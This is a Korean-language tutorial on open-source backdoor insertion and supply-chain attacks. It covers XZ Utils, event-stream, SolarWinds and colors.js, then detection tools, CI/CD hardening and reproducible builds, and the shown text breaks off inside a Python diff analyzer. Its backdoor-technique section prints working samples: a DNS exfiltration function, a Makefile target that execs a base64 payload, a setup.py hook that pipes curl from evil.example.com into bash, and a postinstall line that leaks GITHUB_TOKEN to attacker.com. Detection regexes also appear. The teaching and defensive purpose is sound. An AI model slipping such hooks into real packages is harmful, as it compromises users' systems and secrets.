> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 오픈소스 백도어 삽입 기법

## 0. 초보자를 위한 개념 이해

### 오픈소스 백도어 삽입이란?

오픈소스 백도어 삽입은 공격자가 오픈소스 프로젝트에 기여자로 위장해 장기간 신뢰를 쌓은 뒤, 악성 코드를 코드베이스에 몰래 삽입하는 공격이다. 소스 코드가 공개되어 있음에도 코드 리뷰의 사각지대를 이용해 수개월~수년에 걸쳐 준비된다. 2024년 XZ Utils 사건(CVE-2024-3094)은 2년 이상 잠복한 공격자가 리눅스 시스템 전체를 노렸던 대표적 사례다.

**왜 배우는가:**
```
[오픈소스 백도어의 파급력]

  인기 오픈소스 라이브러리 (예: xz-utils)
           ↓ 악성 코드 삽입
  Linux 배포판 패키지 저장소에 포함
           ↓
  전 세계 서버에 자동 업데이트로 배포
           ↓
  ★ 단 하나의 백도어로 수백만 서버 침해 가능

  [XZ Utils 사례]
  - 공격자 'JiaT75'가 2022년부터 기여 시작
  - 2년간 메인테이너 신뢰 획득
  - 2024년 systemd 연동 SSH 데몬에 백도어 삽입
  - Andres Freund의 우연한 발견으로 노출
```

### 핵심 개념 정리

```
[오픈소스 백도어 삽입 기법 유형]

1. 점진적 신뢰 구축 (Long Game)
   - 수개월간 무해한 기여로 신뢰 획득
   - 메인테이너 지위 획득 후 악성 PR

2. 소셜 엔지니어링
   - 기존 메인테이너에게 접근, 번아웃 유도
   - "내가 유지보수를 도와드릴게요" 전략

3. 난독화 기법
   - 바이너리 테스트 파일 속에 악성 스크립트 숨김
   - CMakeLists.txt, configure.ac 등 빌드 파일 악용
   - 컴파일 단계에서만 악성 코드 활성화

4. 조건부 활성화
   - 특정 환경에서만 동작 (Debian/Ubuntu, systemd 등)
   - 개발자 로컬 테스트에서는 무해, 프로덕션에서만 작동

5. 숨겨진 기능 (Hidden Functionality)
   - 언뜻 보면 성능 최적화처럼 보이는 코드
   - 특정 조건(공격자 키)에서만 백도어 활성화
```

### 필요한 도구 및 환경
- **git log / git blame**: 의심스러운 커밋 추적
- **semgrep**: 악성 패턴 정적 분석
- **OSSF Scorecard**: 오픈소스 프로젝트 보안 점수 측정
- **Sigstore / cosign**: 소프트웨어 아티팩트 서명 검증

### 기초 실습 예제
```python
import subprocess
from pathlib import Path

def audit_git_history(repo_path: str, suspicious_authors: list[str] = None):
    """
    Git 저장소에서 의심스러운 커밋 패턴을 탐지한다.
    오픈소스 백도어 삽입 초기 단계 탐지에 활용.
    """
    repo = Path(repo_path)
    if not (repo / ".git").exists():
        print(f"[-] Git 레포 아님: {repo_path}")
        return

    # 최근 커밋에서 바이너리 파일 추가 탐지
    result = subprocess.run(
        ['git', '-C', repo_path, 'log',
         '--oneline', '--diff-filter=A',
         '--name-only', '--format=%H %ae %s'],
        capture_output=True, text=True
    )

    print("[*] 바이너리/비소스 파일 추가 커밋 탐지:")
    suspicious_extensions = {'.bin', '.xz', '.gz', '.zip', '.so', '.dylib'}
    for line in result.stdout.split('\n'):
        for ext in suspicious_extensions:
            if line.endswith(ext):
                print(f"  [!] 의심 파일 추가: {line}")

    # 빌드 스크립트 수정 탐지
    result2 = subprocess.run(
        ['git', '-C', repo_path, 'log',
         '--oneline', '--',
         'CMakeLists.txt', 'configure.ac', 'Makefile.am',
         'setup.py', 'package.json'],
        capture_output=True, text=True
    )

    if result2.stdout.strip():
        print("\n[*] 빌드 스크립트 수정 커밋:")
        for line in result2.stdout.strip().split('\n')[:10]:
            print(f"  → {line}")

    # 특정 저자의 커밋 통계
    if suspicious_authors:
        for author in suspicious_authors:
            result3 = subprocess.run(
                ['git', '-C', repo_path, 'log',
                 '--author', author, '--oneline'],
                capture_output=True, text=True
            )
            count = len(result3.stdout.strip().split('\n'))
            if result3.stdout.strip():
                print(f"\n[*] 저자 '{author}' 커밋 수: {count}")

# 사용 예시
# audit_git_history("/path/to/open-source-project")
```

---

> **학습 목표**
>
> 이 문서를 완료하면 다음을 할 수 있습니다:
> 1. 소프트웨어 공급망이 무엇인지, 왜 취약한지 설명할 수 있다
> 2. 5가지 공급망 공격 유형을 구분하고 각각의 실제 사례를 말할 수 있다
> 3. XZ Utils 백도어(CVE-2024-3094)의 공격 방법과 탐지 과정을 설명할 수 있다
> 4. 코드 리뷰에서 숨겨진 백도어를 탐지하는 방법을 실습할 수 있다
> 5. SBOM, 의존성 스캔, SHA 핀닝 등 방어 기법을 적용할 수 있다

---

## 0. 소프트웨어 공급망이란?

### 0.1 부품을 사서 조립하는 현대 소프트웨어

현대 소프트웨어 개발은 혼자 모든 것을 만들지 않는다. 마치 자동차 제조사가 타이어, 엔진, 유리를 각각 다른 공급업체에서 사오듯이, 개발자들은 **오픈소스 라이브러리**를 가져다 조립한다.

```
자동차 조립 비유:
  현대자동차 = 최종 제품 (실제 차량)
  타이어 공급업체 A, 엔진 공급업체 B, 유리 공급업체 C = 부품 공급업체

만약 타이어 공급업체 A가 불량 타이어를 납품하면?
  → 현대자동차의 완성차 모두에 문제가 생긴다

소프트웨어 공급망도 동일하다:
  내가 만든 앱 = 최종 제품
  numpy, requests, lodash, log4j = 오픈소스 부품

만약 공격자가 "requests" 라이브러리에 악성 코드를 심으면?
  → requests를 사용하는 모든 프로젝트 (수백만 개)가 감염된다
```

### 0.2 현대 소프트웨어의 의존성 규모

실제 수치를 보면 얼마나 복잡한지 알 수 있다:

- **npm (JavaScript)**: 레지스트리에 240만 개 이상의 패키지
- **PyPI (Python)**: 50만 개 이상의 패키지
- **Maven (Java)**: 수백만 개의 아티팩트

단순한 Node.js 앱 하나가 `node_modules`를 설치하면 **수백에서 수천 개**의 라이브러리를 내려받는다. 이 중 하나라도 오염되면 전체가 위험해진다.

```bash
# 실제 의존성 트리 확인
npm ls --depth=0    # 직접 의존성
npm ls             # 전체 의존성 트리

# Python
pip show requests  # requests가 의존하는 패키지 확인
pipdeptree         # 전체 의존성 트리
```

### 0.3 왜 공급망 공격이 효과적인가?

```
전통적인 해킹:
  "은행을 직접 털자" → 경비가 철저해서 어렵다

공급망 공격:
  "은행이 매일 사용하는 청소 회사를 장악하자"
  → 청소부는 매일 자유롭게 출입한다
  → 은행의 강력한 보안을 우회할 수 있다

소프트웨어:
  기업들이 직접 만든 코드보다 오픈소스 의존성이 훨씬 많다
  기업의 보안 감사는 자체 코드에 집중
  의존성 코드는 "믿을 수 있다"고 가정하는 경향
  → 공급망 공격이 통한다
```

---

## 1. 공급망 공격 유형 분류

### 1.1 타이포스쿼팅 (Typosquatting)

**원리:** 인기 있는 패키지 이름과 유사한 이름으로 악성 패키지를 등록한다.

```
정상 패키지:  requests  (Python HTTP 라이브러리, 월 2억 회 이상 다운로드)
악성 패키지:  reqests   (오타 유도)
              request   (단수형)
              requestss (이중 s)
              requets   (글자 바꾸기)
```

개발자가 패키지 이름을 잘못 타이핑하거나, 자동 완성이 오동작하면 악성 패키지가 설치된다.

**실제 사례 (2017):**
```bash
# 정상
pip install urllib3

# 악성 (타이포스쿼팅)
pip install urllib  # 이미 누군가가 악성 코드를 삽입한 상태로 등록
```

17개의 Python 타이포스쿼팅 패키지가 발견됐고, 일부는 암호화폐 지갑을 탈취하는 코드를 포함했다.

### 1.2 의존성 혼동 (Dependency Confusion)

**원리:** 기업 내부에서만 쓰는 비공개 패키지와 공개 레지스트리의 패키지 이름이 충돌하도록 유도한다.

```
기업 내부:
  내부 PyPI 서버에 "mycompany-utils" (버전 1.0.0) 등록
  개발자들이 이 내부 패키지를 사용

공격자:
  공개 PyPI에 "mycompany-utils" (버전 9.9.9) 등록
  (더 높은 버전 번호로)

패키지 매니저 동작:
  pip install mycompany-utils
  → 공개 레지스트리에서 더 높은 버전(9.9.9)을 우선 선택
  → 공격자의 악성 패키지가 설치됨
```

**실제 사례 (2021):** 보안 연구자 Alex Birsan이 이 기법을 사용해 Apple, Microsoft, PayPal 등 35개 기업의 내부 시스템에 침투 성공. 10만 달러 이상의 버그 바운티 수령.

### 1.3 메인테이너 계정 탈취 (Compromised Maintainer)

**원리:** 신뢰받는 오픈소스 프로젝트의 유지 관리자 계정을 해킹하여 악성 코드를 합법적으로 배포한다.

```
공격자 접근 방법:
1. 피싱 이메일로 npm/PyPI 자격증명 탈취
2. 재사용된 비밀번호를 다른 데이터 유출에서 획득
3. 2FA가 없는 계정을 무차별 대입 공격
4. 사회공학으로 계정 복구 우회
```

**실제 사례 — event-stream (2018):**

```
배경:
  event-stream: Node.js의 스트림 처리 유틸리티
  주간 수백만 회 다운로드, 비트코인 관련 앱들이 사용

공격 과정:
  1. 공격자 "right9ctrl"이 원래 메인테이너 "dominictarr"에게 접근
  2. "프로젝트를 더 이상 관리하지 않는다면 제가 인수하겠습니다" 제안
  3. dominictarr가 npm 퍼블리싱 권한 양도 (그는 돈을 받은 것도 아님)
  4. right9ctrl이 "flatmap-stream" 악성 의존성 추가
  5. flatmap-stream에 난독화된 Copay 비트코인 지갑 탈취 코드 삽입
  6. 수백만 건 설치 → 특정 금액 이상을 보유한 Copay 사용자 공격

탐지:
  GitHub Issue #116에서 개발자 발견
  "왜 이 패키지에 암호화폐 관련 코드가 있죠?"
```

### 1.4 악성 PR (Malicious Pull Request)

**원리:** 합법적인 오픈소스 프로젝트에 기여(Pull Request)를 통해 백도어 코드를 삽입한다.

```
과정:
1. 오픈소스 프로젝트에 정상적인 버그 수정 PR 제출 (신뢰 쌓기)
2. 여러 번의 정상 기여로 메인테이너의 신뢰를 얻음
3. 난독화된 악성 코드를 포함한 PR 제출
4. 메인테이너가 자세히 검토하지 않고 merge
5. 다음 릴리즈에 악성 코드가 포함되어 배포
```

**XZ Utils 사례가 이 패턴의 극단적 예시** — 2년에 걸쳐 신뢰를 쌓았다.

### 1.5 빌드 시스템 침해 (Build System Compromise)

**원리:** 소스 코드 자체는 정상이지만, 빌드/컴파일 과정에서 악성 코드가 삽입된다.

```
소스코드 → [빌드 시스템] → 배포 바이너리

만약 빌드 시스템이 오염되면:
  감사하는 소스코드: 정상
  실제 배포되는 바이너리: 악성 코드 포함

→ 소스코드를 아무리 감사해도 발견 불가
```

**SolarWinds 사례가 이 패턴의 대표적 예시.**

---

## 2. 실제 사례 심층 분석

### 2.1 event-stream (2018) — npm 생태계 공격

이미 위에서 설명했지만 기술적 세부사항을 추가한다.

```javascript
// flatmap-stream에 삽입된 악성 코드 (난독화 해제 버전)
// 원본은 AES-256으로 암호화되어 있었음
var crypto = require('crypto');

function decipher(text, key) {
  var decipher = crypto.createDecipheriv(
    'aes-256-cbc',
    crypto.createHash('sha256').update(key).digest(),
    Buffer.alloc(16)
  );
  return decipher.update(text, 'hex', 'utf8') + decipher.final('utf8');
}

// Copay 비트코인 지갑 앱에서 실행될 때만 활성화
// (패키지 이름으로 타겟 앱 확인)
var app = require('/path/to/copay/app');
if (app && app.bitcore) {
  // 지갑 개인키 및 잔액 정보를 원격 서버로 전송
  // 조건: 잔액 100 BTC 이상 또는 1000 BCH 이상
}
```

**피해:** 특정 Copay 지갑 사용자들의 암호화폐 탈취. 정확한 피해 규모는 알려지지 않음.

### 2.2 SolarWinds (2020) — 빌드 파이프라인 침해

**배경:**
- SolarWinds Orion: 수천 개 기업/기관이 사용하는 IT 모니터링 소프트웨어
- 미국 정부기관(국무부, 재무부, 국방부 등), Fortune 500 기업 다수 사용

**공격 방법:**

```
공격자 (후에 러시아 SVR로 밝혀짐):
  1. SolarWinds의 빌드 환경 침투 (2019년 10월경)
  2. SUNSPOT 악성코드로 빌드 서버 감염
  3. 빌드 과정에서 Orion 소프트웨어에 SUNBURST 백도어 자동 삽입
  4. 코드 서명까지 정상적으로 통과
  5. 2020년 3월~6월: 오염된 업데이트 18,000여 건 배포
  6. 백도어는 2주간 대기 후 활성화 (탐지 우회)
  7. 2020년 12월 사이버보안 회사 FireEye가 발견
```

**SUNBURST 백도어 특징:**
```
- 설치 후 12-14일간 비활성 상태 유지 (초기 탐지 우회)
- 도메인 이름을 통한 C2 통신 (DNS 기반)
- 정상 SolarWinds 트래픽과 유사하게 위장
- 보안 제품 탐지 시 자동 비활성화
- 환경 분석 후 타겟 선별
```

**피해:**
- 미국 정부기관 9개 이상 침해
- 민간 기업 100개 이상 영향
- 정확한 피해 규모는 미공개

### 2.3 XZ Utils (2024) — CVE-2024-3094

#### 공격 타임라인 (상세)

```
2021년 10월:
  Jia Tan(@JiaT75) 계정 생성
  xz-utils 프로젝트에 사소한 버그 수정으로 기여 시작
  → 어떤 의심도 살 만한 이상한 점이 없었음

2022년:
  꾸준한 정상적 기여 (번역, 테스트, 최적화)
  리뷰 요청에 신속 대응, 고품질 패치 제공
  "Jigar Kumar" 등 가짜 계정들이 기존 메인테이너 Lasse Collin에게 압박
  ("당신은 이 프로젝트를 충분히 유지 관리하지 않는다")

2023년:
  Jia Tan이 co-maintainer 권한 획득
  oss-fuzz, libarchive 등 인접 프로젝트에도 기여하며 신뢰 확장

2024년 2월:
  xz-utils 5.6.0 릴리즈
  악성 코드는 git 소스에는 없고 배포용 tarball에만 포함
  빌드 스크립트(build-to-host.m4)가 tarball의 바이너리에서 악성 코드 추출/삽입

2024년 3월 29일:
  Microsoft 엔지니어 Andres Freund가 Debian Sid에서 SSH 로그인이
  약 500ms 느려진 것을 발견
  valgrind로 liblzma 이상 징후 탐지
  CVE-2024-3094 공개

공격 목표:
  systemd → libsystemd → liblzma 경로로 sshd가 liblzma 로드
  특정 ED448 서명이 있는 RSA 공개키로 인증 시도 시
  실제 인증 없이 임의 명령 실행 가능
```

#### 백도어 삽입 기법 (기술 상세)

```bash
# 악성 코드가 숨겨진 위치
tests/files/bad-3-corrupt_lzma2.xz   # 바이너리 페이로드
tests/files/good-large_compressed.lzma # 또 다른 바이너리 페이로드

# build-to-host.m4에서 악성 스크립트 추출
# configure 실행 시 자동으로 liblzma.a에 악성 오브젝트 파일이 링크됨

# 탐지: liblzma 바이너리에서 예상치 못한 IFUNC resolvers 발견
# OpenSSH sshd가 systemd를 통해 liblzma를 간접 로드

# 취약 버전 확인
xz --version | grep -E "^xz \(XZ Utils\) 5\.6\."
strings /usr/lib/x86_64-linux-gnu/liblzma.so.5 | grep "5.6"
```

```c
// 백도어 동작 원리 (개략)
// 실제 코드는 IFUNC resolver에 고도로 난독화된 상태로 삽입됨

// 1. liblzma 로드 시 IFUNC resolver가 악성 코드 실행
// 2. sshd의 RSA_public_decrypt 함수를 후킹
// 3. SSH 인증 시도 감시
// 4. 특정 구조의 RSA 키가 도착하면:
//    - RSA 검증을 건너뜀
//    - 키 안에 인코딩된 명령을 ED448 서명으로 검증
//    - 검증 성공 시 명령 실행 (root 권한)

// 탐지를 피하기 위한 기법:
// 1. git 소스에는 악성 코드 없음 (tarball 전용)
// 2. 테스트 파일로 위장한 바이너리 페이로드
// 3. 멀티스테이지 난독화된 빌드 스크립트
// 4. 조건부 실행: systemd + OpenSSH + x86_64 리눅스에서만 활성화
// 5. 2주간 지연 → 설치 후 즉시 연결하지 않음
```

**탐지가 매우 어려웠던 이유:**
```
1. 소스코드 감사로는 발견 불가 (악성 코드가 바이너리에만 존재)
2. 동작 조건이 매우 구체적 (systemd + sshd + x86_64 + Debian/Fedora)
3. 테스트 환경에서는 활성화되지 않음
4. 공격자가 2년 이상 신뢰를 쌓은 계정으로 배포
5. 암호화/서명 검증 코드라 "정상처럼 보이는" 어셈블리
```

### 2.4 Colors.js / Faker.js 사보타주 (2022)

**이것은 악의적인 외부 공격이 아니라 메인테이너 본인의 의도적 사보타주다.**

```
배경:
  Marak Squires: colors.js (주간 2천만+ 다운로드)와 
                 faker.js의 단독 메인테이너
  "대기업들이 내 오픈소스를 무료로 쓰면서 기여하지 않는다"
  
사보타주:
  2022년 1월 7일 colors.js 버전 1.4.44-liberty-2 배포
  faker.js 버전 6.6.6 배포
  
악성 동작:
  무한 루프로 터미널에 "LIBERTY LIBERTY LIBERTY" 반복 출력
  아스키 아트 플래그 출력
  후속 버전들도 비정상 코드
  
영향:
  colors.js에 의존하는 수천 개 프로젝트 중단
  AWS CDK, Jest 등 주요 프로젝트 영향
  npm이 악성 버전을 되돌리고 계정 정지

메시지:
  "나는 무료로 일하는 것을 멈추겠다. 
   아니면 6자리 숫자의 연봉 계약을 제안하라."
```

**교훈:** 공급망 보안은 외부 공격자뿐 아니라 **합법적 메인테이너 본인**도 위협이 될 수 있다는 것을 보여준다. `npm lock`, `pip hash` 등 버전 고정이 중요하다.

---

## 3. 오픈소스 프로젝트 신뢰 확보 후 백도어 삽입

### 3.1 사회공학 기반 기여자 위협

```
단계 1: 정상 기여 (버그 수정, 문서화, 테스트 추가)
        → 메인테이너의 주목을 받지만 의심은 없다

단계 2: 신뢰 구축 (지속적 기여, 코드 리뷰 참여, 빠른 응답)
        → "이 사람은 믿을 수 있는 기여자"라는 인식 형성

단계 3: 메인테이너 압박 (번아웃 유도, 가짜 계정으로 압박)
        "왜 이 기여를 아직도 merge 안 하세요?"
        "이 프로젝트 관리가 제대로 되지 않는 것 같아요"
        → 메인테이너를 피로하게 만들어 리뷰를 허술하게 만든다

단계 4: 권한 확보 (커밋 권한, PyPI/npm 배포 권한)
        → 이제 악성 코드를 직접 배포할 수 있다

단계 5: 악성 커밋 삽입 (난독화, 작은 변경으로 위장)
        "성능 최적화", "메모리 누수 수정" 등으로 위장
        → 메인테이너가 세부 검토 없이 승인
```

### 3.2 코드에 백도어를 숨기는 기법

```python
# 기법 1: 유니코드 제어 문자를 이용한 논리 변조
# (CVE-2021-42574 - Trojan Source 공격)
# 코드 리뷰에서는 정상으로 보이지만 컴파일러/인터프리터는 다르게 해석

# 예시: 오른쪽에서 왼쪽으로 읽는 유니코드 제어 문자 (RLO, U+202E)
# 리뷰어가 보는 것:  if user.is_admin:  # check if admin
# 실제 실행 순서:    if user.is_admin:  # check if not admin
#                    (주석 안의 RLO 문자가 코드 순서를 바꿈)

# 탐지: 비표준 유니코드 문자 검색
import re

def detect_trojan_source(code: str) -> list[int]:
    """Trojan Source 공격에 사용되는 유니코드 제어 문자 탐지"""
    dangerous_chars = [
        '‪',  # Left-to-Right Embedding (LRE)
        '‫',  # Right-to-Left Embedding (RLE)
        '‬',  # Pop Directional Formatting (PDF)
        '‭',  # Left-to-Right Override (LRO)
        '‮',  # Right-to-Left Override (RLO) ← 가장 위험
        '⁦',  # Left-to-Right Isolate
        '⁧',  # Right-to-Left Isolate
        '⁨',  # First Strong Isolate
        '⁩',  # Pop Directional Isolate
        '‏',  # Right-to-Left Mark
    ]
    suspicious_lines = []
    for i, line in enumerate(code.splitlines(), 1):
        for char in dangerous_chars:
            if char in line:
                suspicious_lines.append(i)
                break
    return suspicious_lines
```

```python
# 기법 2: 조건부 악성 코드 (시간/환경 기반 활성화)
# 평소에는 완전히 정상 동작하다가 특정 조건에서만 악성 행위를 한다

import os
import time
import hashlib


def legitimate_data_processor(data: bytes) -> bytes:
    """정상처럼 보이는 데이터 처리 함수"""
    # 정상적인 처리
    result = hashlib.sha256(data).digest()

    # 숨겨진 백도어: 여러 조건이 동시에 만족할 때만 활성화
    # 개별 조건은 각각 무해해 보인다
    _check_environment(data)

    return result


def _check_environment(data: bytes) -> None:
    """조건부 악성 코드 — 코드 리뷰 시 각 조건이 무해해 보임"""
    is_production = os.getenv("CI") is None          # CI 환경이 아님
    is_late_month = int(time.strftime("%d")) > 20    # 매달 21일 이후
    has_ssh = os.path.exists("/var/run/sshd.pid")    # SSH 데몬 실행 중
    is_root_like = os.getuid() == 0                  # root 실행 중

    if is_production and is_late_month and has_ssh and is_root_like:
        _exfiltrate(data)  # 데이터 외부 유출


def _exfiltrate(data: bytes) -> None:
    """데이터 외부 전송 — 함수명이 모호하게 작성됨"""
    import socket
    try:
        # DNS 기반 데이터 유출 (방화벽 우회)
        encoded = data[:32].hex()
        socket.gethostbyname(f"{encoded}.malicious.example.com")
    except Exception:
        pass  # 실패해도 조용히 넘어감
```

```bash
# 기법 3: 빌드 스크립트에 페이로드 숨기기
# setup.py, Makefile, CMakeLists.txt의 설치 훅

# Makefile 예시 (악성)
# 처음 보면 단순한 테스트 실행처럼 보인다
check:
	@python3 -c "import base64; exec(base64.b64decode(open('tests/fixtures/data.bin').read()))"
	@echo "All tests passed"

# setup.py의 cmdclass 훅 악용
from setuptools import setup
from setuptools.command.install import install
import subprocess

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        # 설치 후 자동 실행: 원격 스크립트 다운로드 및 실행
        subprocess.run(["curl", "-s", "https://evil.example.com/init.sh", "|", "bash"], shell=True)

setup(
    name='legitimate-looking-package',
    cmdclass={'install': PostInstallCommand},
    # ...
)
```

```bash
# 기법 4: 테스트 파일로 위장한 바이너리 페이로드
# 이진 데이터를 tests/ 또는 data/ 디렉토리에 숨김
# 빌드 시 자동으로 실행되는 스크립트가 추출/실행

# 의심스러운 패턴 탐지
find . -name "*.bin" -o -name "*.xz" -o -name "*.lzma" | \
  grep -E "(test|fixture|data)" | \
  xargs file | \
  grep -v "text"  # 텍스트가 아닌 바이너리 파일 찾기
```

---

## 4. GitHub Actions 워크플로우 오염

### 4.1 공격 경로: CI/CD 파이프라인 탈취

```yaml
# 취약한 GitHub Actions 워크플로우
# pull_request_target 트리거 + 외부 PR 코드 직접 실행 = 위험
name: CI (Vulnerable)
on:
  pull_request_target:  # 위험! fork PR도 메인 레포의 권한으로 실행됨
                        # 즉, secrets, GITHUB_TOKEN (write) 등에 접근 가능

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # fork의 코드를 체크아웃
      - run: npm ci
      - run: npm test  # 공격자의 package.json postinstall 스크립트가 실행될 수 있음
                       # → CI 환경의 secrets 탈취 가능
```

**공격 시나리오:**
```bash
# 공격자의 package.json
{
  "scripts": {
    "postinstall": "curl -s $GITHUB_TOKEN.attacker.com"
    # GitHub token이 외부로 유출됨
  }
}
```

### 4.2 안전한 CI/CD 설정

```yaml
# 안전한 워크플로우
name: CI (Safe)
on:
  pull_request:  # 외부 fork PR은 secrets 없이 실행됨 (읽기 전용 토큰)

jobs:
  test:
    runs-on: ubuntu-latest
    # 명시적으로 최소 권한 설정
    permissions:
      contents: read
      pull-requests: read
    steps:
      - uses: actions/checkout@v4  # PR의 fork 코드를 기본으로 체크아웃
      - run: npm ci && npm test
```

```yaml
# 민감 작업은 별도 워크플로우로 분리
# pull_request_target을 꼭 써야 한다면:
name: Label PR (Safe pull_request_target)
on:
  pull_request_target:
    types: [opened, labeled]

jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write  # 라벨 추가만 허용
    steps:
      # 절대로 PR 코드를 체크아웃하거나 실행하지 않음
      - name: Add label
        uses: actions/github-script@v7
        with:
          script: |
            github.rest.issues.addLabels({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.payload.pull_request.number,
              labels: ['needs-review']
            })
```

### 4.3 외부 Actions 공급망 공격

```yaml
# 취약: 태그 참조 (공격자가 태그를 다른 커밋으로 옮길 수 있음)
- uses: actions/some-action@v1         # v1 태그가 언제든 변경 가능

# 취약: 브랜치 참조 (언제든 코드가 변경됨)
- uses: some-org/some-action@main

# 안전: 커밋 SHA 고정 (불변)
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

```bash
# 현재 Actions의 SHA 확인
# 예: actions/checkout@v4의 실제 SHA
curl -s https://api.github.com/repos/actions/checkout/git/ref/refs/tags/v4 \
  | jq -r '.object.sha'

# dependabot으로 Actions 자동 업데이트 설정
# .github/dependabot.yml
```

```yaml
# .github/dependabot.yml — Actions 자동 보안 업데이트
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    # SHA 핀닝 + 자동 업데이트 = 최선
```

---

## 5. 컴파일러 백도어 (Ken Thompson의 "Trusting Trust")

1984년 Ken Thompson의 Turing Award 강연에서 제시한 개념으로, 공급망 공격의 철학적 기반이 된다.

```c
/*
 * 컴파일러 자체에 백도어를 심는 메타 공격
 * 
 * 단계 1: 컴파일러가 login 프로그램을 컴파일할 때
 *          자동으로 백도어를 삽입하는 코드를 컴파일러에 추가
 * 
 * 단계 2: 컴파일러가 자기 자신을 컴파일할 때도
 *          이 백도어 삽입 코드를 전파하는 코드 추가
 * 
 * 단계 3: 컴파일러 소스코드에서 악성 코드를 완전히 제거
 * 
 * 결과: 컴파일된 컴파일러 바이너리 안에만 악성 로직이 남음
 *       소스코드를 아무리 감사해도 발견 불가
 *       이 컴파일러로 login을 컴파일하면 백도어가 삽입됨
 *       이 컴파일러로 컴파일러를 재컴파일해도 백도어가 전파됨
 */

// 의사코드: 컴파일러 내부에 숨겨진 로직
void compile(char *source) {
    if (is_compiling("login")) {
        // login 프로그램에 백도어 자동 삽입
        // 패스워드 "backdoor123"으로도 로그인 가능하게
        inject_backdoor();
    }
    if (is_compiling("cc")) {
        // 컴파일러 자체를 컴파일할 때 이 로직을 전파
        inject_self_replication();
    }
    // 정상 컴파일 계속
    normal_compile(source);
}
```

**현실적 대응: Reproducible Builds (재현 가능한 빌드)**

```bash
# 개념: 동일한 소스에서 빌드하면 항상 동일한 바이너리가 나와야 한다
# 두 개의 독립적 환경에서 빌드한 결과가 다르면 빌드 시스템이 오염된 것

# Debian Reproducible Builds 프로젝트
# https://reproducible-builds.org/

# 재현 가능한 빌드를 위한 타임스탬프 고정
export SOURCE_DATE_EPOCH=$(git log -1 --format=%ct)
make

# 두 빌드 결과 비교
sha256sum build1/myapp build2/myapp
# 동일해야 함

# diffoscope: 두 바이너리의 차이를 상세히 비교
diffoscope build1/myapp build2/myapp
```

---

## 6. 탐지 방법

### 6.1 의존성 스캐너

```bash
# npm 취약점 감사
npm audit
npm audit fix  # 자동 수정 (주의: 주요 버전 업그레이드는 별도 검토 필요)

# pip 취약점 확인
pip-audit
# 또는
safety check

# Snyk (다언어 지원)
snyk test
snyk monitor  # 지속적 모니터링

# OWASP Dependency-Check (Java/JavaScript/Python 등)
dependency-check --project "MyApp" --scan ./  --out ./report
```

### 6.2 SBOM (Software Bill of Materials)

SBOM은 소프트웨어가 사용하는 모든 구성 요소의 목록이다. 자동차의 부품 목록(BOM)과 유사하다.

```bash
# SBOM 생성 — SPDX 형식
syft /path/to/project -o spdx-json > sbom.spdx.json

# SBOM 생성 — CycloneDX 형식
syft /path/to/project -o cyclonedx-json > sbom.cdx.json

# SBOM으로 취약점 검사
grype sbom:./sbom.spdx.json

# Docker 이미지 SBOM
syft docker:myapp:latest -o spdx-json > sbom.spdx.json
```

### 6.3 Git Diff 보안 분석 도구 (Python)

```python
#!/usr/bin/env python3
"""
Git Security Analyzer — PR/커밋의 보안 위험 요소 탐지

사용법:
  python3 git_security.py --repo . --base main --head feature-branch
  python3 git_security.py --repo . --commit abc1234
  python3 git_security.py --repo . --base HEAD~5 --head HEAD
"""

import argparse
import re
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path


# 고위험 패턴: 백도어 삽입 징후
# 각 패턴이 발견되면 즉시 세부 검토가 필요하다
CRITICAL_PATTERNS = {
    "Eval/Exec 실행":   re.compile(r"\b(eval|exec)\s*\(", re.IGNORECASE),
    "Base64 실행":      re.compile(r"base64[^;]*decode[^;]*exec|exec[^;]*base64", re.IGNORECASE),
    "셸 명령 실행":     re.compile(r"subprocess\.(?:call|run|Popen)|os\.system|os\.popen"),
    "소켓 외부 연결":   re.compile(r"socket\.connect\b|socket\.create_connection"),
    "Trojan Source":    re.compile(r"[‪-‮⁦-⁩‏‎]"),
    "메모리 직접 접근": re.compile(r"ctypes\.(cdll|windll|CDLL)|mmap\.mmap"),
}

# 중위험 패턴: 맥락에 따라 정상일 수 있지만 검토가 필요하다
MEDIUM_PATTERNS = {
    "외부 HTTP 요청":  re.compile(r"urllib\.request|requests\.(get|post)|http\.client"),
    "실행 권한 부여":  re.compile(r"os\.chmod.*0o[7][5-7][5-7]|chmod.*\+x"),
    "환경변수 접근":   re.compile(r"os\.environ\b|os\.getenv\b"),
    "DNS 조회":        re.compile(r"socket\.gethostbyname|socket\.getaddrinfo"),
    "암호화 라이브러리": re.compile(r"import\s+(?:Crypto|cryptography|nacl|bcrypt)"),
}

# 수정되면 세부 검토가 필요한 고위험 파일 경로 패턴
SENSITIVE_FILE_PATTERNS = [
    r"\.github/workflows/",   # CI/CD 파이프라인 설정
    r"setup\.py$",            # Python 패키지 설치 훅
    r"Makefile$",             # 빌드 스크립트
    r"configure\.ac$",        # autoconf 설정
    r"\.m4$",                 # m4 매크로 (XZ Utils 공격에 사용됨)
    r"CMakeLists\.txt$",      # CMake 빌드 설정
    r"Dockerfile$",           # 컨테이너 이미지 정의
    r"/\.travis\.yml$",       # Travis CI 설정
]


@dataclass
class SecurityFinding:
    """보안 발견사항 데이터 클래스"""
    severity: str         # "CRITICAL" | "MEDIUM"
    file_path: str        # 발견된 파일 경로
    line_number: int      # 발견된 라인 번호
    pattern_name: str     # 매칭된 패턴 이름
    line_content: str     # 해당 라인의 내용 (최대 100자)


def get_diff(repo_path: Path, base: str, head: str) -> str:
    """두 커밋/브랜치 간의 git diff 텍스트 반환"""
    result = subprocess.run(
        ["git", "-C", str(repo_path), "diff", base, head],
        capture_output=True,
        text=True,
        timeout=60,
        errors="replace",  # 바이너리 파일의 잘못된 UTF-8 무시
    )
    return result.stdout


def analyze_diff(diff_text: str) -> list[SecurityFinding]:
    """diff 텍스트에서 보안 패턴 탐지 후 발견사항 목록 반환"""
    findings: list[SecurityFinding] = []
    current_file = ""
    line_num = 0

    for line in diff_text.splitlines():
        # 새 파일 시작
        if line.startswith("diff --git"):
            match = re.search(r"b/(.+)$", line)
            current_file = match.group(1) if match else ""
